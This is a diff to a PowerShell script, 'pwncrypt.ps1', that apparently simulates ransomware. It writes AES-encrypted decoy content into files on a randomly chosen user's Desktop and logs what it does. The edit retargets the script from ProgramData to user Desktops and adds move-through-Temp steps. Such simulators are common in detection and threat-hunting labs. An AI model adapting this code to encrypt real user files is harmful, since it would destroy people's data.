@@ -1,4 +1,4 @@
-   # Define the log file path
+ # Define the log file path
 $logFilePath = "C:\ProgramData\entropygorilla.log"
 $scriptName = "pwncrypt.ps1"
 
@@ -58,8 +58,7 @@ try {
 
     # Select a random user directory
     $randomUser = $userDirectories | Get-Random
-    # $destFolder = Join-Path $randomUser.FullName "Desktop"
-    $destFolder = "C:\programdata"
+    $destFolder = Join-Path $randomUser.FullName "Desktop"
     Log-Message "Selected user: $($randomUser.Name). Desktop folder: $destFolder."
 
     # Check if the Desktop folder exists for the selected user
@@ -110,13 +109,14 @@ try {
             # Encrypt the file content
             $encryptedContent = Encrypt-Text $fakeContent $key $iv
 
-
             # Write the encrypted content to the new file
             [System.IO.File]::WriteAllBytes($tempPath, $encryptedContent)
 
-            # & cmd /c "more $($tempPath) > $($filePath)"
-            (Get-Content -Path $tempPath) | Out-File -FilePath $filePath -Force 
-             
+            # Convert the encrypted temp file back into the main file
+            (Get-Content -Path $tempPath) | Out-File -FilePath $filePath -Force
+            Move-Item -Path $filePath -Destination "C:\Windows\Temp\$($randomFileName)" -Force
+            Move-Item -Path "C:\Windows\Temp\$($randomFileName)" -Destination $filePath -Force
+
             Remove-Item -Path $tempPath
             Log-Message "Encrypted content written to: $filePath."
 
